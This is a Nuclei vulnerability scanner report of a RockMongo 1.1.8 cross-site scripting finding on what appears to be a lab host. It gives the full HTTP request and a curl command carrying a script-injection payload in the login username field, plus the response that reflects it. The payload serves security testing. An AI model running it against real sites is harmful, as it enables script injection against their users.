### RockMongo 1.1.8 - Cross-Site Scripting (rockmongo-xss) found on http://10.10.116.124
---
**Details**: **rockmongo-xss**  matched at http://10.10.116.124

**Protocol**: HTTP

**Full URL**: http://10.10.116.124/index.php?action=login.index

**Timestamp**: Sat Feb 18 15:05:17 +0000 GMT 2023

**Template Information**

| Key | Value |
|---|---|
| Name | RockMongo 1.1.8 - Cross-Site Scripting |
| Authors | pikpikcu |
| Tags | rockmongo, xss, packetstorm |
| Severity | high |
| Description | RockMongo 1.1.8 contains a cross-site scripting vulnerability which allows attackers to inject arbitrary JavaScript into the response returned by the application. |
| CVSS-Metrics | [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N) |
| CWE-ID | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| CVSS-Score | 7.20 |

**Request**
```http
POST /index.php?action=login.index HTTP/1.1
Host: 10.10.116.124
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 116
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3
```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: text/html; charset=UTF-8
Date: Sat, 18 Feb 2023 15:05:16 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.53 (Debian)
Set-Cookie: PHPSESSID=f4d2ce6454dd290dddf4703c616d7ea3; path=/
Vary: Accept-Encoding
X-Powered-By: PHP/8.0.19

 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; margin: 0 auto; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>

        
        <form action="/index.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value=""><script>alert(document.domain)</script>">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control is-invalid">
                <span class="invalid-feedback">Please enter your password.</span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? Use the guest account! (<code>Ctrl+U</code>)</p>
            <!-- use guest:guest credentials until registration is fixed. "admin" user account is off limits!!!!! -->
        </form>
    </div>
</body>
</html>
```

References: 
- https://packetstormsecurity.com/files/136658/rockmongo-1.1.8-cross-site-request-forgery-cross-site-scripting.html

**CURL Command**
```
curl -X 'POST' -d 'more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36' 'http://10.10.116.124/index.php?action=login.index'
```
---
Generated by [Nuclei 2.7.9](https://github.com/projectdiscovery/nuclei)